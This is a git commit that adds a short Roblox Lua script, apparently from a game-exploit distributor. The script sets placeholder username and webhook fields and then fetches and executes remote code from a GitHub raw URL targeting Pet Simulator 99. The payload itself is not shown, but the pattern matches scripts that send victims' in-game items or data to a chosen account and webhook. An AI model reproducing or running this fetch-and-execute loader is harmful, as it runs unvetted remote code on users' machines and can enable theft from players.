866c8eea1f6ace35c4fc38be35d5355dc016d43a
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-18 17:12:12 +0200

    Add generated script

---
+++ scripts/auraisop.lua
@@ -0,0 +1,7 @@
+
+Username = "hi"
+Username2 = "hi"
+Webhook = "hi.com.xd"
+
+-- The rest of the code stays constant, and only the three fields above are updated dynamically
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
